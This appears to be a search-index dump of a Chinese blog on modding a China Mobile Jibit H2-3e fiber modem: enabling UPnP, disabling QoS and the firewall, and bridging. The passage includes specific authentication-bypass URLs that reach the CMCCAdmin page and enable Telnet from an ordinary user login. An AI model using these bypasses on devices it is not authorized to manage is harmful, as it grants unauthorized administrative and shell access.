\u200b\u7684\u8bdd\u200b\uff0c\u200b\u7406\u8bba\u200b\u4e0a\u200b\u6709\u200b\u5176\u4ed6\u200b\u5947\u6280\u6deb\u5de7\u200b\u7684\u200b\u73a9\u6cd5\u200b\uff1aTR069 \u200b\u5185\u200b\u7f51\u200b\u96a7\u9053\u200b\u3001\u200b\u5f02\u5730\u200b\u7ec4\u7f51\u200b\u3001\u200b\u5185\u200b\u7f51\u200b\u6e17\u900f\u200b\uff1f   \u200b\u53ef\u60dc\u200b\u56fd\u5149\u200b\u660e\u5929\u200b\u8981\u200b\u4e0a\u73ed\u200b\u4e86\u200b\uff0c\u200b\u7cbe\u529b\u200b\u4e0d\u591f\u200b\u7ee7\u7eed\u200b\u6df1\u5165\u200b\u4e86\u200b\uff0cmark \u200b\u4e00\u4e0b\u200b\u540e\u9762\u200b\u6709\u200b\u673a\u4f1a\u200b\u6298\u817e\u200b\u8fd9\u4e2a\u200b\u3002</p>"},{"location":"10/5/#upnp","title":"\u542f\u7528\u200b UPnP","text":"<p>\u200b\u5f00\u542f\u200b UPnP \u200b\u901a\u7528\u200b\u5373\u63d2\u5373\u7528\u200b\u529f\u80fd\u200b\uff0cUPnP \u200b\u6216\u200b\u901a\u7528\u200b\u5373\u63d2\u5373\u7528\u200b\u662f\u200b\u4e00\u79cd\u200b\u534f\u8bae\u200b\u96c6\u200b\uff0c\u200b\u5141\u8bb8\u200b\u8bbe\u5907\u200b\u8fde\u63a5\u200b\u548c\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\uff08\u200b\u4e3b\u8981\u200b\u662f\u200b\u6e38\u620f\u200b\uff09\u200b\u81ea\u52a8\u200b\u8f6c\u53d1\u200b\u7aef\u53e3\u200b\u3002\u200b\u53ef\u4ee5\u200b\u6781\u5927\u200b\u7684\u200b\u6539\u5584\u200b\u6211\u4eec\u200b\u7684\u200b NAT \u200b\u7c7b\u578b\u200b\uff0c\u200b\u867d\u7136\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5927\u5185\u200b\u7f51\u200b\uff0c\u200b\u4f46\u662f\u200b\u6539\u5584\u200b\u4e00\u70b9\u200b\u662f\u200b\u4e00\u70b9\u200b\u5427\u200b\uff1a</p> <p> </p>"},{"location":"10/5/#qos","title":"\u5173\u95ed\u200b QoS","text":"<p>\u200b\u4e0d\u200b\u9700\u8981\u200b\u5bf9\u200b\u5e26\u5bbd\u200b\u8fdb\u884c\u200b\u9650\u901f\u200b\uff0c\u200b\u800c\u4e14\u200b\u6211\u4eec\u200b\u4e0a\u7f51\u200b\u7684\u200b INTERNET \u200b\u4e1a\u52a1\u200b\u4f18\u5148\u7ea7\u200b\u8fd8\u662f\u200b\u6700\u4f4e\u200b\uff1f\u200b\u8fd9\u200b\u4e0d\u80fd\u200b\u5fcd\u200b\uff01\u200b\u76f4\u63a5\u200b\u5173\u6389\u200b QoS \u200b\u5373\u53ef\u200b\uff0c\u200b\u975e\u5e38\u200b\u7701\u200b\u4e8b\u513f\u200b\uff1a</p> <p> </p>"},{"location":"10/5/#_10","title":"\u9632\u706b\u5899\u200b\u914d\u7f6e","text":"<p>\u200b\u9996\u5148\u200b\u53d6\u6d88\u200b\u6240\u6709\u200b\u5b89\u5168\u200b\u9632\u62a4\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u5c06\u200b\u9632\u706b\u5899\u200b\u7b49\u7ea7\u200b\u8c03\u5230\u200b\u4f4e\u200b\uff1a</p> <p> </p> <p>\u200b\u8fd9\u6837\u200b\u5728\u200b\u732b\u200b\u4e0b\u9762\u200b\u7684\u200b\u673a\u5668\u200b\u4f1a\u200b\u81ea\u52a8\u200b\u83b7\u53d6\u200b\u5230\u200b IPv6 \u200b\u516c\u7f51\u200b\u5730\u5740\u200b\uff0c\u200b\u7136\u540e\u200b Python \u200b\u542f\u52a8\u200b\u4e2a\u200b  Web \u200b\u670d\u52a1\u200b\u9a8c\u8bc1\u200b\u4e00\u4e0b\u200b\uff1a</p> Bash<pre><code>python3 -m http.server --bind ::\n</code></pre> <p>\u200b\u624b\u673a\u200b\u4f7f\u7528\u200b SIM \u200b\u8fd0\u8425\u5546\u200b\u7f51\u7edc\u200b\u4e5f\u200b\u6210\u529f\u200b\u8bbf\u95ee\u200b\uff1a</p> <p> </p>"},{"location":"10/5/#_11","title":"\u5149\u732b\u200b\u6865\u63a5","text":"<p>\u200b\u5176\u5b9e\u200b\u5982\u679c\u200b\u5149\u732b\u200b\u6865\u63a5\u200b\u7684\u8bdd\u200b\uff0c\u200b\u4e4b\u524d\u200b\u7684\u200b\u300c\u200b\u5149\u732b\u200b\u8c03\u6559\u200b\u300d\u200b\u90e8\u5206\u200b\u64cd\u4f5c\u200b\u90fd\u200b\u65e0\u6240\u8c13\u200b\u4e86\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8fd9\u6837\u200b\u76f8\u5f53\u4e8e\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\u8def\u7531\u5668\u200b\u62e8\u53f7\u200b\u4e86\u200b\u3002\u200b\u5149\u732b\u200b\u6865\u63a5\u200b\u7684\u200b\u597d\u5904\u200b\uff1a</p> <ol> <li>\u200b\u6539\u5584\u200b NAT \u200b\u7c7b\u578b\u200b\uff08\u200b\u4e2d\u56fd\u7535\u4fe1\u200b\u6709\u200b\u516c\u7f51\u200b IPv4 \u200b\u7684\u8bdd\u200b\uff0c\u200b\u751a\u81f3\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8def\u7531\u5668\u200b\u62e8\u53f7\u200b\u83b7\u53d6\u200b\u516c\u7f51\u200b IPv4\uff09</li> <li>\u200b\u63d0\u9ad8\u200b\u7f51\u7edc\u200b\u4f53\u9a8c\u200b\uff0c\u200b\u51cf\u8f7b\u200b\u5149\u732b\u200b\u8d1f\u62c5\u200b\uff0c\u200b\u538b\u529b\u200b\u8f6c\u79fb\u200b\u5230\u200b\u4e86\u200b\u8def\u7531\u5668\u200b</li> <li>\u200b\u65b9\u4fbf\u200b\u7528\u6237\u200b\u81ea\u5b9a\u4e49\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5149\u732b\u200b\u7684\u200b\u5b98\u65b9\u200b\u9650\u5236\u200b\u6709\u70b9\u200b\u591a\u200b\uff0c\u200b\u76f4\u63a5\u200b\u4ea4\u7ed9\u200b\u8def\u7531\u5668\u200b\u7684\u8bdd\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f88\u200b\u7075\u6d3b\u200b\u914d\u7f6e\u200b</li> </ol> <p>\u200b\u800c\u4e14\u200b\u636e\u8bf4\u200b\u6c5f\u82cf\u200b\u5357\u4eac\u200b\u79fb\u52a8\u200b\u53ef\u4ee5\u200b\u6700\u200b\u591a\u200b 4 \u200b\u62e8\u200b\uff0c\u200b\u90a3\u200b\u4e0d\u200b\u5c31\u200b\u7f8e\u6ecb\u6ecb\u200b\u4e86\u200b\uff0c\u200b\u76f4\u63a5\u200b\u51c6\u5907\u200b\u5f00\u59cb\u200b\u6865\u63a5\u200b\u3002</p>"},{"location":"10/5/#_12","title":"\u8bb0\u5f55\u200b\u914d\u7f6e","text":"<p>\u200b\u56e0\u4e3a\u200b\u65e0\u6cd5\u200b\u76f4\u63a5\u200b\u4fee\u6539\u200b\u5df2\u6709\u200b\u7684\u200b\u7f51\u7edc\u200b\u4e3a\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\uff1a</p> <p> </p> <p>\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u6211\u4eec\u200b\u5220\u6389\u200b\u73b0\u6709\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u7136\u540e\u200b\u65b0\u5efa\u200b1\u200b\u4e2a\u200b\u8fde\u63a5\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u8bb0\u5f55\u200b\u4e00\u4e0b\u200b\u4e4b\u524d\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u91cd\u70b9\u200b\u8bb0\u5f55\u200b\u4e00\u4e0b\u200b VLAN \u200b\u6a21\u5f0f\u200b\u548c\u200b ID\uff1a</p> <p> </p>"},{"location":"10/5/#_13","title":"\u65b0\u5efa\u200b\u8fde\u63a5","text":"<p>\u200b\u65b0\u5efa\u200b 1 \u200b\u4e2a\u200b WAN \u200b\u8fde\u63a5\u200b\uff0c\u200b\u4e3b\u8981\u200b\u914d\u7f6e\u200b\u6284\u200b\u4e00\u4e0b\u200b\u6211\u4eec\u200b\u4e4b\u524d\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\u7684\u200b\u5373\u53ef\u200b\uff0c\u200b\u4e0b\u9762\u200b\u662f\u200b\u56fd\u5149\u200b\u7684\u200b\u914d\u7f6e\u200b\u8be6\u60c5\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u6c5f\u82cf\u200b\u79fb\u52a8\u200b\u6700\u5927\u200b\u652f\u6301\u200b 4 \u200b\u62e8\u200b\uff0c\u200b\u6b63\u597d\u200b\u4e5f\u200b\u6709\u200b 4 \u200b\u4e2a\u200b LAN \u200b\u53e3\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u76f4\u63a5\u200b\u52fe\u9009\u200b\u8fd9\u200b\u51e0\u4e2a\u200b LAN \u200b\u53e3\u200b\uff0c\u200b\u5177\u4f53\u200b\u914d\u7f6e\u200b\u7ec6\u8282\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u786e\u4fdd\u200b\u5220\u6389\u200b\u4e4b\u524d\u200b\u7684\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u53ea\u6709\u200b 1 \u200b\u4e2a\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\u914d\u7f6e\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u751f\u6548\u200b\u7684\u8bdd\u200b\uff0c\u200b\u8bb0\u5f97\u200b\u91cd\u542f\u200b\u4e00\u4e0b\u200b\u5149\u732b\u200b\u3002  </p>"},{"location":"10/5/#_14","title":"\u62e8\u53f7\u4e0a\u7f51","text":"<p>\u200b\u6865\u63a5\u200b\u6210\u529f\u200b\u540e\u200b\uff0cMBP \u200b\u76f4\u63a5\u200b\u7f51\u7ebf\u200b\u63d2\u5149\u200b\u732b\u200b\u4e0a\u200b\uff0c\u200b\u5373\u53ef\u200b\u62e8\u53f7\u4e0a\u7f51\u200b\u6210\u529f\u200b\uff1a</p> <p> </p> <p>\u200b\u56e0\u4e3a\u200b\u5149\u732b\u200b\u6539\u200b\u4e86\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u6211\u4eec\u200b\u624b\u52a8\u200b\u5728\u200b\u8def\u7531\u5668\u200b\u4e0a\u200b\u8fdb\u884c\u200b\u62e8\u53f7\u4e0a\u7f51\u200b\uff1a</p> <p> </p> <p>\u200b\u7f8e\u6ecb\u6ecb\u200b\uff0c\u200b\u5f00\u59cb\u200b\u5c3d\u60c5\u200b\u4eab\u53d7\u200b\u4f60\u200b\u7684\u200b\u7f51\u7edc\u200b\u5427\u200b~~~</p>"},{"location":"10/5/#_15","title":"\u5c0f\u200b\u4f17\u200b\u573a\u666f","text":"<p>\u200b\u80af\u5b9a\u200b\u4f1a\u200b\u6709\u200b\u7f51\u53cb\u200b\u597d\u5947\u200b\u5149\u732b\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u5b58\u5728\u200b\u6865\u63a5\u200b\u548c\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\u5417\u200b\uff1f\u200b\u90a3\u200b\u80af\u5b9a\u200b\u662f\u200b\u53ef\u4ee5\u200b\u7684\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\u8fd9\u6837\u200b\u7684\u200b\u573a\u666f\u200b\u975e\u5e38\u5c11\u200b\uff0c\u200b\u4f46\u662f\u200b\u56fd\u5149\u200b\u6211\u200b\u8fd8\u662f\u200b\u9700\u8981\u200b\u7684\u200b\u3002</p> <p>\u200b\u56e0\u4e3a\u200b\u56fd\u5149\u200b\u5199\u200b\u8fd9\u200b\u7bc7\u6587\u7ae0\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f4f\u200b\u7684\u200b\u8fd8\u662f\u200b LOFT \u200b\u516c\u5bd3\u200b\uff0c\u200b\u548c\u200b\u697c\u4e0a\u200b\u7684\u200b\u5c0f\u54e5\u200b\u5171\u7528\u200b 1 \u200b\u4e2a\u5149\u200b\u732b\u200b\u3002\u200b\u6211\u200b\u5982\u679c\u200b\u6539\u4e86\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u60f3\u200b\u8ba9\u200b\u697c\u4e0a\u200b\u5c0f\u54e5\u200b\u65e0\u611f\u200b\u7684\u8bdd\u200b\uff0c\u200b\u53ea\u80fd\u200b\u5728\u200b\u5149\u732b\u200b\u4e0b\u200b\u5916\u63a5\u200b 1 \u200b\u4e2a\u200b\u8def\u7531\u5668\u200b\uff0c\u200b\u7136\u540e\u200b\u697c\u4e0a\u200b\u5c0f\u54e5\u200b\u7684\u200b\u7f51\u7ebf\u200b\u63d2\u200b\u8def\u7531\u5668\u200b\u4e86\u200b\u3002\u200b\u4f46\u662f\u200b\u8fd9\u6837\u200b\u4e5f\u200b\u592a\u200b\u5f20\u626c\u200b\u548c\u200b\u4e0d\u200b\u4f18\u96c5\u200b\u4e86\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5355\u72ec\u200b\u7ed9\u200b\u697c\u4e0a\u200b\u5c0f\u54e5\u200b\u914d\u7f6e\u200b 1 \u200b\u4e2a\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u5176\u4ed6\u200b\u5168\u90e8\u200b\u8d70\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\u3002</p> <p>\u200b\u5176\u5b9e\u200b\u5f88\u200b\u7b80\u5355\u200b\uff0c\u200b\u5c31\u662f\u200b\u6865\u63a5\u200b\u6a21\u5f0f\u200b\u7ed1\u5b9a\u200b 2\u30013\u30014 \u200b\u7aef\u53e3\u200b\uff1a</p> <p> </p> <p>\u200b\u62e8\u53f7\u200b\u6a21\u5f0f\u200b\u7ed1\u5b9a\u200b 1 \u200b\u7aef\u53e3\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u6d4b\u8bd5\u200b\u5747\u200b\u6b63\u5e38\u200b\uff0c\u200b\u771f\u7684\u200b\u592a\u200b\u4f18\u96c5\u200b\u4e86\u200b\uff0c\u200b\u8fd8\u200b\u8282\u7701\u200b\u4e86\u200b 1 \u200b\u4e2a\u200b\u8def\u7531\u5668\u200b\u7684\u200b\u94b1\u200b\uff1a</p> <p> </p>"},{"location":"11/5/","title":"IPv6\u200b\u4e0e\u200b\u5149\u732b","text":""},{"location":"11/5/#_1","title":"\u5410\u69fd\u200b\u4e00\u4e0b","text":"<p>\u200b\u968f\u7740\u200b\u7f51\u7edc\u200b\u7684\u200b\u53d1\u5c55\u200b\uff0c\u200b\u56fd\u5185\u200b\u8fd0\u8425\u5546\u200b\u7684\u200b\u5149\u732b\u200b\u9650\u5236\u200b\u8d8a\u6765\u8d8a\u200b\u4e25\u683c\u200b\u3002\u200b\u867d\u7136\u200b\u51fa\u53d1\u70b9\u200b\u53ef\u80fd\u200b\u662f\u200b\u4e3a\u4e86\u200b\u4fdd\u62a4\u200b\u7528\u6237\u200b\u5bb6\u5ead\u8bbe\u5907\u200b\u7684\u200b\u7f51\u7edc\u5b89\u5168\u200b\uff0c\u200b\u4f46\u662f\u200b\u5bf9\u4e8e\u200b\u6211\u4eec\u200b\u8fd9\u4e9b\u200b\u6709\u200b\u6298\u817e\u200b\u9700\u6c42\u200b\u7684\u200b\u7528\u6237\u200b\u6765\u8bf4\u200b\u95e8\u69db\u200b\u5c31\u200b\u9ad8\u200b\u4e86\u200b\u5f88\u591a\u200b\u3002\u200b\u4e0b\u9762\u200b\u56fd\u5149\u200b\u5c31\u200b\u62ff\u200b\u6c5f\u82cf\u200b\u5357\u4eac\u200b\u79fb\u52a8\u200b\u7684\u200b\u5149\u732b\u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u8bb0\u5f55\u200b\u4e00\u4e0b\u200b\u56fd\u5149\u200b\u6211\u200b\u7684\u200b\u6298\u817e\u200b\u8fc7\u7a0b\u200b\u3002</p>"},{"location":"11/5/#_2","title":"\u5149\u732b\u200b\u73b0\u72b6","text":""},{"location":"11/5/#_3","title":"\u5916\u89c2\u200b\u6982\u89c8","text":"<p>\u200b\u8bbe\u5907\u200b\u540d\u79f0\u200b\uff1a\u200b\u5409\u200b\u6bd4\u7279\u200b\u65e0\u6e90\u200b\u5149\u7ea4\u200b\u63a5\u5165\u200b\u7528\u6237\u7aef\u200b\u8bbe\u5907\u200b(GPON ONU) \u200b\u8bbe\u5907\u200b\u7c7b\u578b\u200b\uff1a\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u667a\u80fd\u7f51\u200b\u5173\u200b \u200b\u8bbe\u5907\u200b\u578b\u53f7\u200b\uff1aH2-3e\uff08\u200b\u65e0\u200b\u8bed\u97f3\u200b/\u200b\u65e0\u200b Wi-Fi\uff09 \u200b\u751f\u4ea7\u65e5\u671f\u200b\uff1a2022-08-18</p> <p>\u200b\u5bb6\u200b\u7528\u5149\u200b\u732b\u200b\u7684\u200b\u6027\u80fd\u200b\u90fd\u200b\u6bd4\u8f83\u200b\u5783\u573e\u200b\uff0c\u200b\u56fd\u5149\u200b\u6211\u200b\u76ee\u524d\u200b\u4f7f\u7528\u200b\u7684\u200b\u5149\u732b\u200b\u914d\u7f6e\u200b\u8fd8\u200b\u7b97\u662f\u200b\u4e0d\u9519\u200b\u7684\u200b\u4e86\u200b\uff08\u200b\u77ee\u5b50\u200b\u91cc\u200b\u62d4\u9ad8\u200b\u4e2a\u200b\uff09\uff0c\u200b\u6700\u8d77\u7801\u200b\u6709\u200b 4 \u200b\u4e2a\u200b\u5343\u5146\u200b LAN \u200b\u53e3\u200b\uff0c\u200b\u4e0b\u9762\u200b\u662f\u200b\u51e0\u5f20\u200b\u5916\u89c2\u200b\u56fe\u7247\u200b\uff1a</p> \u200b\u80cc\u9762\u200b\u4fe1\u606f\u200b\u6b63\u9762\u200b\u4fe1\u606f\u200b\u63a5\u53e3\u200b\u4fe1\u606f\u200b <p> </p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u51fa\u200b\u662f\u200b 2022 \u200b\u5e74\u200b 8 \u200b\u6708\u4efd\u200b\u751f\u4ea7\u200b\u7684\u200b\u5149\u732b\u200b\uff0c\u200b\u6240\u4ee5\u200b\u7406\u8bba\u200b\u4e0a\u200b\u6765\u8bf4\u200b\u56fa\u4ef6\u200b\u662f\u200b\u6bd4\u8f83\u200b\u65b0\u200b\u7684\u200b\uff0c\u200b\u95e8\u69db\u200b\u4e5f\u200b\u6bd4\u200b\u7f51\u4e0a\u200b\u90a3\u4e9b\u200b\u8001\u200b\u7684\u200b\u5149\u732b\u200b\u95e8\u69db\u200b\u9ad8\u200b\u4e00\u70b9\u200b\u3002 </p> <p> </p> <p>\u200b\u6b63\u9762\u200b\u6ca1\u200b\u5565\u200b\u597d\u770b\u200b\u7684\u200b\uff0c\u200b\u6beb\u65e0\u200b\u4eae\u70b9\u200b\u3002</p> <p></p> <p>\u200b\u5c31\u200b\u8fd9\u200b 4 \u200b\u4e2a\u200b\u5168\u200b\u5343\u5146\u200b LAN \u200b\u53e3\u200b\u611f\u89c9\u200b\u8fd8\u200b\u6709\u70b9\u200b\u7528\u5904\u200b\uff0c\u200b\u540e\u9762\u200b\u6539\u200b\u6865\u63a5\u200b\u53ef\u4ee5\u200b\u591a\u63a5\u200b\u4e00\u4e9b\u200b\u8bbe\u5907\u200b\u3002</p>"},{"location":"11/5/#_4","title":"\u7cfb\u7edf\u200b\u6982\u51b5","text":"<p>\u200b\u666e\u901a\u7528\u6237\u200b\u53ea\u80fd\u200b\u4f7f\u7528\u200b\u5149\u732b\u200b\u80cc\u9762\u200b\u7684\u200b user \u200b\u666e\u901a\u7528\u6237\u200b\u767b\u5f55\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u65b0\u4e00\u4ee3\u200b\u5149\u732b\u200b\u90fd\u200b\u662f\u200b\u901a\u8fc7\u200b\u8fdc\u7a0b\u200b\u4e0b\u53d1\u200b\u5b9a\u671f\u200b\u66f4\u6539\u200b\u5bc6\u7801\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5e76\u200b\u6ca1\u6709\u200b\u9ed8\u8ba4\u200b\u7684\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\uff0c\u200b\u8fd9\u5757\u200b\u5148\u653e\u200b\u4e00\u653e\u200b\uff0c\u200b\u6211\u4eec\u200b\u5148\u200b\u4f7f\u7528\u200b\u666e\u901a\u7528\u6237\u200b\u767b\u5f55\u200b\u770b\u770b\u200b\u518d\u8bf4\u200b\uff1a</p> <p> </p> <p>\u200b\u4e0b\u9762\u200b\u662f\u200b\u51e0\u5f20\u200b\u7cfb\u7edf\u200b\u5185\u90e8\u200b\u7684\u200b\u56fe\u7247\u200b\u4fe1\u606f\u200b\uff1a</p> \u200b\u5bbd\u5e26\u7f51\u200b\u5173\u200b\u8bbe\u5907\u200bDHCP\u200b\u5b89\u5168\u200b\u5bb6\u957f\u200b\u5b58\u50a8\u200b\u7f51\u901f\u200b\u4e0a\u7f51\u200b\u66f4\u65b0\u200b\u7528\u6237\u200b <p> </p> <p>\u200b\u5c55\u793a\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u6e29\u5ea6\u200b\u548c\u200b\u8054\u7f51\u200b\u670d\u52a1\u200b\u60c5\u51b5\u200b\u7b49\u200b\u57fa\u672c\u200b\u4fe1\u606f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u56fd\u5149\u200b\u6211\u200b\u8fd9\u91cc\u200b\u8054\u7f51\u200b\u670d\u52a1\u200b\u60c5\u51b5\u200b\u5c11\u200b\u4e86\u200b 1 \u200b\u4e2a\u200b\u300c\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u5bbd\u5e26\u200b\u7ba1\u7406\u4e2d\u5fc3\u200b\u300d\uff0c\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u56fd\u5149\u200b\u6211\u200b\u540e\u9762\u200b\u624b\u52a8\u200b\u5220\u6389\u200b\u8fd9\u4e2a\u200b\u670d\u52a1\u200b\u4e86\u200b\uff0c\u200b\u5220\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u670d\u52a1\u200b\u6211\u4eec\u200b\u7684\u200b\u5149\u732b\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u8fdc\u7a0b\u200b\u4e0b\u53d1\u200b\u4efb\u52a1\u200b\u4e86\u200b\uff0c\u200b\u8d85\u7ba1\u200b\u5bc6\u7801\u200b\u4e5f\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u5b9a\u671f\u200b\u66f4\u6539\u200b\u3002\u200b\u4e0b\u9762\u200b\u770b\u770b\u200b\u6ca1\u6709\u200b\u5220\u200b\u4e4b\u524d\u200b\u662f\u200b\u5565\u6837\u5b50\u200b\u7684\u200b\uff1a</p> <p> </p> <p></p> <p>\u200b\u5c55\u793a\u200b\u4e86\u200b CPU\u3001\u200b\u5185\u5b58\u200b\u7684\u200b\u4f7f\u7528\u7387\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u63a5\u53e3\u200b\u7684\u200b\u8fde\u63a5\u200b\u4fe1\u606f\u200b\u7b49\u200b\u3002\u200b\u786c\u4ef6\u200b\u578b\u53f7\u200b\u4e3a\u200b\u5409\u200b\u6bd4\u7279\u200b H2-3e\uff0c\u200b\u6240\u200b\u4f7f\u7528\u200b\u7684\u200b\u56fa\u4ef6\u200b\u7248\u672c\u200b HWVer-A911</p> <p></p> <p></p> <p></p> <p> </p> <p></p> <p></p> <p></p> <p></p> <p></p>"},{"location":"11/5/#_5","title":"\u7b80\u5355\u200b\u603b\u7ed3","text":"<p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u666e\u901a\u7528\u6237\u200b\u8fdb\u53bb\u200b\u57fa\u672c\u4e0a\u200b\u5565\u200b\u4e5f\u200b\u5e72\u4e0d\u4e86\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u524d\u7aef\u200b\u9875\u9762\u200b\u7ed9\u200b\u4eba\u200b\u4e00\u79cd\u200b\u534a\u6210\u54c1\u200b\u7684\u200b\u611f\u89c9\u200b\uff0c\u200b\u6211\u4eec\u200b\u5f88\u591a\u200b\u8fdb\u9636\u200b\u64cd\u4f5c\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u754c\u9762\u200b\u80af\u5b9a\u200b\u662f\u200b\u6ca1\u6cd5\u200b\u64cd\u4f5c\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u8d85\u7ba1\u200b\uff08CMCCAdmin\uff09\u200b\u7684\u200b\u8eab\u4efd\u200b\u8fdb\u200b\u540e\u53f0\u200b\u624d\u200b\u53ef\u4ee5\u200b\u3002</p>"},{"location":"11/5/#_6","title":"\u8d85\u7ba1\u200b\u6743\u9650","text":""},{"location":"11/5/#_7","title":"\u8d8a\u6743\u200b\u8bbf\u95ee","text":"<p>\u200b\u4e2d\u56fd\u79fb\u52a8\u200b\u8fd9\u4e2a\u200b\u5409\u200b\u6bd4\u7279\u200b H2-3e \u200b\u5149\u732b\u200b\u7684\u200b Web \u200b\u7cfb\u7edf\u200b\u5199\u200b\u7684\u200b\u5f88\u200b\u5783\u573e\u200b\uff0c\u200b\u5728\u200b user \u200b\u7528\u6237\u200b\u767b\u5f55\u200b\u7684\u200b\u72b6\u6001\u200b\u4e0b\u200b\uff0c\u200b\u7136\u540e\u200b\u8bbf\u95ee\u200b\u4e0b\u9762\u200b\u7684\u200b\u754c\u9762\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u8d8a\u6743\u200b\u8bbf\u95ee\u200b\u5230\u200b CMCCAdmin \u200b\u7684\u200b\u7ba1\u7406\u200b\u9875\u9762\u200b\uff1a</p> <p>http://192.168.1.1/start.ghtml</p> <p> </p> <p>\u200b\u4f46\u662f\u200b\u5427\u200b\u867d\u7136\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u8fd9\u4e2a\u200b\u754c\u9762\u200b\u4e86\u200b\uff0c\u200b\u8fd8\u662f\u200b\u6709\u200b\u4e00\u4e9b\u200b\u529f\u80fd\u200b\u6211\u4eec\u200b\u662f\u200b\u65e0\u6cd5\u200b\u64cd\u4f5c\u200b\u7684\u200b\uff08\u200b\u6865\u63a5\u200b\u529f\u80fd\u200b\u3001\u200b\u9632\u706b\u5899\u200b\u5173\u95ed\u200b\u7b49\u200b\uff09\uff0c\u200b\u6240\u4ee5\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u5149\u660e\u6b63\u5927\u200b\u7684\u200b\u62ff\u5230\u200b\u771f\u6b63\u200b\u7684\u200b CMCCAdmin \u200b\u7528\u6237\u200b\u7684\u200b\u5bc6\u7801\u200b\u6765\u200b\u767b\u5f55\u200b\u64cd\u4f5c\u200b\u8fd9\u4e2a\u200b\u754c\u9762\u200b\u624d\u884c\u200b\u3002</p>"},{"location":"11/5/#telnet","title":"\u5f00\u542f\u200b Telnet","text":"<p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u5149\u200b\u732b\u200b\u662f\u200b\u6ca1\u6709\u200b\u5f00\u542f\u200b Telnet 23 \u200b\u7aef\u53e3\u200b\u7684\u200b\uff0c\u200b\u8fd9\u6837\u200b\u6211\u4eec\u200b\u5c31\u200b\u6ca1\u6cd5\u200b\u548c\u200b\u5149\u732b\u200b shell \u200b\u4ea4\u4e92\u200b\u4e86\u200b\uff1a</p> <p> </p> <p>\u200b\u8fd8\u662f\u200b\u9274\u6743\u200b\u4e0d\u5f53\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u5728\u200b user \u200b\u7528\u6237\u200b\u767b\u5f55\u200b\u7684\u200b\u72b6\u6001\u200b\u4e0b\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u8bbf\u95ee\u200b\u4e0b\u9762\u200b\u7684\u200b URL \u200b\u76f4\u63a5\u200b\u8df3\u8f6c\u200b\u5230\u200b Telnet \u200b\u7684\u200b\u914d\u7f6e\u200b\u9875\u9762\u200b\uff1a</p> <p>http://192.168.1.1/getpage.gch?pid=1002&amp;nextpage=tele_sec_tserver_t.gch</p> <p>\u200b\u7136\u540e\u200b\u5f00\u542f\u200b Telnet\uff0c\u200b\u8bbe\u7f6e\u200b\u597d\u200b Telnet \u200b\u7684\u200b\u7528\u6237\u540d\u200b  CMCCAdmin \u200b\u7684\u200b\u5bc6\u7801\u200b\uff0c\u200b\u7136\u540e\u200b\u52fe\u9009\u200b WAN \u200b\u548c\u200b LAN \u200b\u4fa7\u200b\u8bbf\u95ee\u200b\uff08\u200b\u4fdd\u5b58\u200b \u200b\u591a\u200b\u64cd\u4f5c\u200b\u51e0\u6b21\u200b\u5c31\u884c\u200b\uff09\uff1a</p> <p> </p> 